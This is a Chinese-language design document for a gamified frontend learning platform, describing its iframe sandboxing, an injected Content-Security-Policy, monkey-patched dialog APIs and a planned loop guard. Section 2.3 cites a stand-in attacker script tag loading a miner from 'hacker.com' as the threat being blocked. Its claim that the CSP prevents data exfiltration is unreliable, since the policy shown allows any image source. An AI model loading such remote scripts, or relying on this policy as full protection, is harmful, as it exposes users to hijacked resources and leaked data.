# 项目价值与核心技术沉淀

## 1. 项目背景与核心业务架构

### 1.1 项目背景与定位

传统的纯文本前端学习路线往往枯燥乏味，且初学者常被繁琐的本地环境配置劝退，缺乏即时反馈。
本项目（Frontend Adventure）旨在打造一个**任务驱动、游戏化**的前端交互式学习平台。通过精心设计的关卡地图（涵盖 HTML、CSS、JavaScript 等），让用户能够在浏览器中“边学边练”，通过编写代码并经过沙箱自动验证来解锁下一关。这极大地降低了学习门槛，并提升了学习的趣味性与成就感。

### 1.2 核心业务逻辑闭环

项目的核心业务链路是一个完整的“学习-实践-反馈”闭环，主要由以下几个核心模块串联：

1. **内容引擎（Markdown 驱动）**：
   - **逻辑**：关卡的教学内容、初始代码、过关校验脚本全部集中在纯 Markdown 文件中定义。
   - **价值**：前端利用自定义解析器动态提取 Markdown 元数据。这种“内容与代码分离”的数据驱动模式，极大地降低了后续关卡的维护和扩展成本，新增关卡只需编写 MD 文件即可。
2. **交互编辑（可伸缩编码区）**：
   - **逻辑**：集成 `@uiw/react-codemirror`，提供语法高亮、代码补全的沉浸式编辑体验。
   - **价值**：支持与题目区域的拖拽自适应伸缩（使用 `requestAnimationFrame` 优化拖拽虚影性能）以及一键折叠，提供现代 IDE 般的舒适体验。
3. **实时预览与自动评测（双引擎沙箱机制）**：
   - **逻辑**：用户输入代码后，平台不仅能实时在独立 iframe 中渲染视觉效果，还能在点击“运行”时，动态执行关卡预设的 JS 验证脚本进行逻辑断言评测。
   - **价值**：提供亚秒级的代码运行反馈，评测通过后触发撒花动画（`canvas-confetti`）并解锁下一关，形成正向游戏化反馈循环。

## 2. 核心技术亮点：双沙箱安全架构设计与优化

### 2.1 安全沙箱的背景与痛点

在构建上述提到的“自动评测”功能时，我们需要允许用户在浏览器中实时编写并运行 HTML、CSS 和 JavaScript 代码。由于用户输入的代码不可控（可能包含恶意脚本、无限循环或危险操作），直接在主应用执行会导致：

1. **内存泄漏与状态污染**：用户脚本修改全局变量或未解绑事件，导致主应用状态错乱。
2. **XSS 攻击与权限滥用**：恶意脚本尝试读取主站 Cookie、LocalStorage，或通过 DOM 树向上爬取主应用节点。
3. **主线程阻塞**：`while(true)` 等死循环会直接卡死整个浏览器标签页。
4. **UI 体验破坏**：滥用 `alert`、`confirm` 导致页面弹出原生对话框，破坏沉浸式学习体验。

### 2.2 初始架构：分离的“双沙箱”机制

为了实现亚秒级的代码运行反馈并保证主应用的稳定性，我们设计了将“视觉渲染”与“逻辑校验”完全分离的双 `iframe` 架构：

- **视觉预览沙箱**（`PreviewWindow.tsx`）：
  - 采用持久化渲染 UI 的机制。
  - 使用带有 `sandbox="allow-scripts"` 的 `<iframe />`，并且**没有赋予 `allow-same-origin`**。这样浏览器将其视为独特的 `null` 源，实现了跨域隔离（DOM 边界隔离），切断了 XSS 提权的路径。
- **逻辑校验沙箱**（`useCodeLevel.ts`）：
  - 采用隐式、一次性的执行环境，用于断言用户的代码是否通关（**阅后即焚**）。
  - 动态创建隐藏 `iframe` 并注入代码，使用 `new Function("document", "window", validationScript)` 将验证逻辑限制在该沙箱的作用域内（全局变量隔离）。
  - 验证结束后立即 `removeChild(iframe)`，触发浏览器的垃圾回收，阻断内存泄漏。

### 2.3 深度安全优化：防范同源沙箱内的危险操作

尽管基础沙箱隔离了主应用，但如果视觉预览沙箱中执行了恶意代码，仍可能导致弹窗骚扰或暗中挖矿等行为。为此，我们对 `PreviewWindow.tsx` 进行了深度优化：

#### 优化实现：CSP 注入与 API 劫持 (Monkey Patching)

我们在向预览 iframe 注入用户代码之前，强制插入了一段防御性的 HTML 结构：

```html
<!-- 限制网络请求，防止引入外部恶意脚本，仅允许内联脚本和样式 -->
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval'; style-src 'unsafe-inline'; img-src * data: blob:;"
/>
<script>
  // 劫持危险的 BOM API，防止无限弹窗阻塞主线程 UI
  window.alert = function (msg) {
    console.warn("沙箱拦截了 alert:", msg);
  };
  window.confirm = function () {
    console.warn("沙箱拦截了 confirm");
    return false;
  };
  window.prompt = function () {
    console.warn("沙箱拦截了 prompt");
    return null;
  };
  window.open = function () {
    console.warn("沙箱拦截了 window.open");
    return null;
  };
</script>
```

#### 优化的原理与目的：

1. **CSP (内容安全策略) 拦截网络滥用**：
   - `default-src 'none'` 和 `script-src 'unsafe-inline'` 严格限制了 iframe 内的网络请求。
   - **目的**：防止用户通过 `<script src="http://hacker.com/miner.js">` 加载外部挖矿脚本，或者通过 `fetch` 在后台发送恶意网络请求（DDoS 或数据外传）。
2. **API 劫持 (Monkey Patching) 防止 UI 阻塞**：
   - 提前重写了沙箱 `window` 上的 `alert`、`confirm`、`prompt` 和 `open` 方法。
   - **目的**：防止恶意脚本通过无限循环的弹窗迫使用户关闭页面，或者随意打开新窗口，确保学习体验不被破坏。

### 2.4 未来的演进方向：终极防御死循环 (AST 注入)

对于纯 CPU 计算层面的死循环（如 `while(true)`），CSP 和 API 劫持无法拦截。业界通用的终极解决方案是 **AST（抽象语法树）代码转换**。

**核心思路（类似 LeetCode/CodePen）**：

1. 在代码进入 iframe 之前，使用 AST 解析器（如 Babel）解析用户的 JS 代码。
2. 找到所有的循环节点（`WhileStatement`、`ForStatement` 等）。
3. 强制在循环体内部注入时间探针代码：
   ```javascript
   const _loopStart = Date.now();
   while (true) {
     if (Date.now() - _loopStart > 1000)
       throw new Error("检测到死循环！");
     // 用户原始代码
   }
   ```
   这样即可确保即使发生死循环，最多也只会阻塞沙箱线程 1 秒钟，随后抛出异常中断执行，彻底解决浏览器卡死的问题。这是我们在平台应对更复杂算法题时的储备技术方案。
